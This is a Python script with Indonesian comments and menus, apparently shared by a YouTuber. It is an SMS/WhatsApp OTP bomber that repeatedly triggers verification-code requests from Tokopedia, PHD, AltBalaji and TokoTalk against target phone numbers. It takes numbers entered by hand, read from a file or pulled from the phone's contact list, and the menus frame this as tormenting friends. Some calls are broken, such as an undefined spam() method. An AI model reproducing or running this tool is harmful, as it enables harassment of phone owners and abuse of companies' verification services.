#!/usr/bin/python
# Halo Gw MR_DARK Gw Udah Buat Script Premium Wa Yang Bisa Di Decode >_<
# KUY LANJUT
from requests import ConnectionError
from time import sleep
import requests,random,json,time,sys,os,re
# -----------------------------------------------------------
# DISINI GW BUAT WARNA DULU
# ---------------------------------------------------------------

# -----------------------WARNA----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'
# -------------------------------------------------------
# Sebuah Program Python Yg Menggunakan Program Berorientasi Object
#------------------------Classes------------------------

class spam:
		
	def dark_format_auto(text):
        	for x in text + '\n':
                	sys.stdout.write(x)
                	sys.stdout.flush()
                	sleep(random.random() * 0.05)
	def __init__(self, nomer):
		self.nomer = nomer
		
			
	def tokped(self):
		rands=random.choice(open('dark.txt').readlines()).split('\n')[0]
		kirim = {
			'User-Agent' : rands,
			'Accept-Encoding' : 'gzip, deflate',
			'Connection' : 'keep-alive',
			'Origin' : 'https://accounts.tokopedia.com',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'X-Requested-With' : 'XMLHttpRequest',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		formulir = {
			"otp_type" : "116",
			"msisdn" : self.nomer,
			"tk" : Token,
			"email" : '',
			"original_param" : "",
			"user_id" : "",
			"signature" : "",
			"number_otp_digit" : "6"
		}
		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
			return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
		else:
			return f'\x1b[92mSpamm Tokped {self.nomer} {h}Success!'

	def phd(self):
		param = {'phone_number':self.nomer}
		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
			return f'\x1b[92mSpamm PHD {self.nomer} {h}Success!'
		else:
			return f'\x1b[91mSpamm PHD {self.nomer} {m}Fail!'
			
	def balaji(self):
		urlb="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
		kod="62"
		ata={
				"country_code":kod,
				"phone_number":self.nomer
			}
		head={
			"Content-Length":f"{len(str(ata))}",
			"Accept":"application/json, text/plain, */*",
			"Origin":"https://lite.altbalaji.com",
			"Save-Data":"on",
			"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
			"Content-Type":"application/json;charset=UTF-8",
			"Referer":"https://lite.altbalaji.com/subscribe?progress=input",
			"Accept-Encoding":"gzip, deflate, br",
			"Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6"
			}
		req=requests.post(urlb,data=json.dumps(ata),headers=head)
		if '{"status":"ok"}' in req.text:
			return f'\x1b[92mSpamm BALAJI {self.nomer} {h}Success!'
		else:
			return f'\x1b[92mSpamm BALAJI {self.nomer} {m}Fail!'
	def TokoTalk(self):
		data='{"key":"phone","value":"'+str(self.nomer)+'"}'
		head={
			"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
			"content-type":"application/json;charset=UTF-8"
		}
		if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications",data = data,headers=head).text:
			return f'\x1b[92mSpamm TokoTalk {self.nomer} {h}Success!'
		else:
			return f'\x1b[92mSpamm TokoTalk {self.nomer} {m}Fail!'
# ------------------------------------------------------------

# ---------------------------Fungsi----------------------------
def apakah():
	while True:
		lan=str(input(k+'\tLAGI? y/n : '+h))
		if( lan == 'y' or lan == 'Y'):
			jnspam()
		elif(lan == 'n' or lan == 'N'):
			print ('JAN LUPA SUBS MR_DARK')
			time.sleep(4)
			os.system('xdg-open https://youtube.com/channel/UCnti7B0HaFE0izlHKwZMn8A')
			break
		else:
			continue
def files():
	fil=str(input(k+'\tFile : '+h))
	if fil in os.listdir(os.getcwd()):
		l=open(fil,'r').readlines()
		js=int(input(k+'\tTotal spam : '+h))
		dly=int(input(k+'\tDelay : '+h))
		for pp in range(js):
			for d in range(len(l)-1):
				io=l[d].split('\n')[0]
				z=spam(io)
				if jns == 'ktbs':
					print('\t'+z.spam())
				elif jns == 'tkpd':
					print('\t'+z.tokped())
				elif jns == 'blji':
					print('\t'+z.balaji())
				elif jns == 'smua':
					print('\t'+z.spam())
					print('\t'+z.tokped())
					print('\t'+z.balaji())
					print('\t'+z.phd())
					print('\t'+z.TokoTalk())
				elif jns == 'pehd':
					print('\t'+z.phd())
				elif jns == 'ttk':
					print('\t'+z.TokoTalk())
				else:
					print()
				time.sleep(dly)
		apakah()
	else:
		print(m+f'\tFile {fil} doesn`t exist')
def single():
	nomer=str(input(k+'\t[+] Nomor Wa ~> '+h))
	jm=int(input(k+'\t[+] Total Spam Wa ~> '+h))
	for oo in range(jm):
		z=spam(nomer)
		if jns == 'ktbs':
			print('\t'+z.spam())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		else:
			print()
		time.sleep(30)
	apakah()
def multi():
	nomer=[]
	jum=int(input(k+'\tTotal number : '+h))
	for i in range(jum):
		nomer.append(str(input(k+f'\tNumber -{i+1} : '+h)))
	spm=int(input(k+'\tTotal spam : '+h))
	dly=int(input(k+'Delay : '+h))
	kk=len(nomer)
	for i in range(spm):
		for ss in range(kk):
			z=spam(nomer[ss])
			if jns == 'ktbs':
				print('\t'+z.spam())
			elif jns == 'tkpd':
				print('\t'+z.tokped())
			elif jns == 'blji':
				print('\t'+z.balaji())
			elif jns == 'smua':
				print('\t'+z.spam())
				print('\t'+z.tokped())
				print('\t'+z.balaji())
				print('\t'+z.phd())
				print('\t'+z.TokoTalk())
			elif jns == 'pehd':
				print('\t'+z.phd())
			elif jns == 'ttk':
				print('\t'+z.TokoTalk())
			else:
				print()
		time.sleep(dly)
	apakah()
def termux():
	os.system('termux-contact-list > .contact')
	po=json.loads(open('.contact','r').read())
	lenpo=len(po)
	for poh in range(lenpo):
		print(m+str(poh+1)+' '+k+po[poh]['name'])
	nj=po[int(input(u+'\tchoose > '+h))-1]['number']
	dly=int(input(u+'\tDelay > '+h))
	for w in range(int(input(u+'\tTotal spam : '+h))):
		z=spam(nj)
		if jns == 'ktbs':
			print('\t'+z.spam())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		time.sleep(dly)
	apakah()
def main():
	dark_format_auto(M+'  SPAM INI SANGAT BRUTAL LANJUTKAN?')
	dark_format_auto(W+'(===================================)')
	print ('')
	dark_format_auto(C+'\t['+W+'1'+C+']'+C+' LANJUTKAN'+C+' ( '+H+'KARNA PINGIN ISENGIN TEMEN'+C+' )')
	dark_format_auto(C+'\t['+W+'2'+C+']'+M+' KELUAR'+C+' ( '+H+'KARNA TAKUT'+C+' )')
	pil=str(input(H+'〙'+C+'LANJUTKAN?'+W+' ~> '+A))
	if( pil == '1' or pil == '01'):
		single()
	elif( pil == '2' or pil == '02'):
		print ('Jan Lupa Subs MR_DARK')
		os.system('exit')
	elif( pil == '0' or pil == '00'):
		jnspam()
	else:
		print(m+'             INPUT KOSONG COK!')
		time.sleep(2)
		main()
def dark_format_auto(text):
        for x in text + '\n':
                sys.stdout.write(x)
                sys.stdout.flush()
                sleep(random.random() * 0.05)
def dark_format(text):
        for x in text + '\n':
                sys.stdout.write(x)
                sys.stdout.flush()
                sleep(random.random() * 0.05)
def auto_format(text):
        for x in text + '\n':
                sys.stdout.write(x)
                sys.stdout.flush()
                sleep(random.random() * 0.02)
def dark_format_0992():
	os.system('clear')
	print (C+'Subs YT'+W+' MR_DARK!'+C+' :v')
	time.sleep(2)
	os.system('xdg-open https://youtube.com/channel/UCnti7B0HaFE0izlHKwZMn8A')
	time.sleep(2)
	os.system('clear')
	time.sleep(2)

	auto_format(''+C+'''
 _____     ______     ______     __  __        __     __     ______    
/\  __-.  /\  __ \   /\  == \   /\ \/ /       /\ \  _ \ \   /\  __ \   
\ \ \/\ \ \ \  __ \  \ \  __<   \ \  _"-.     \ \ \/ ".\ \  \ \  __ \  
 \ \____-  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\     \ \__/".~\_\  \ \_\ \_\ 
  \/____/   \/_/\/_/   \/_/ /_/   \/_/\/_/      \/_/   \/_/   \/_/\/_/ 
                                                                       
                   '''+W+'By: ./'+A+' MR_DARK\n\t\t' + M + ' YT' +P+ ' >'+K+' MR_DARK')
def dark():
        print ('')
        print ('')
        dark_format_auto(A+'PILIHAN'+W+' :')
        dark_format_auto(C+'\t['+W+'1'+C+']'+W+' SPAM WA NUKLIR SAMPE NANGIS!'+C+' ( '+H+'Aktif ✅'+C+' )')
        dark_format_auto(C+'\t['+W+'2'+C+']'+W+' SPAM WA '+M+'PHD'+C+' ( '+H+'Aktif ✅'+C+' )')
        dark_format_auto(C+'\t['+W+'3'+C+']'+W+' SPAM WA KitaBisa'+C+' ( '+M+'OFF 🚫'+C+' )')
        dark_format_auto(C+'\t['+W+'4'+C+']'+W+' SPAM WA TOKOPEDIA'+C+' ( '+H+'Aktif ✅'+C+' )')
        dark_format_auto(C+'\t['+W+'5'+C+']'+W+' SPAM WA TOKOTALK !'+C+' ( '+H+'Aktif ✅'+C+' )')
        dark_format_auto(C+'\t['+W+'6'+C+']'+W+' SPAM WA BALAJI'+C+' ( '+M+'Udah Mati Guys 🚫'+C+' )')
        dark_format_auto(C+'\t['+W+'7'+C+']'+M+' EXIT'+C+' ( '+H+'Aktif'+C+' )')
        print ('')
def dark_exit():
	print (C+'Byee Jan Lupa Subs MR_DARK')
	os.system('exit')
def jnspam():
	global jns
	dark_format_0992()
	dark()
	while True:
		oy=str(input(H+'〙'+C+'Pilih Njir'+W+' ~'+A+'> '))
		if( oy == '1' or oy == '01' ):
			jns='smua'
			break
		elif( oy == '2' or oy == '02' ):
			jns='pehd'
			break
		elif( oy == '3' or oy == '03' ):
			jns='ktbs'
			break
		elif( oy == '4' or oy == '04' ):
			jns='tkpd'
			break
		elif( oy == '5' or oy == '05' ):
			jns='ttk'
			break
		elif( oy == '6' or oy == '06' ):
			jns='blji'
			break
		elif( oy == '0' or oy == '00' ):
			sys.exit()
		else:
			print(m+'             Jangan Kosong Cok!')
			continue
	main()
if __name__ == '__main__':
	jnspam()
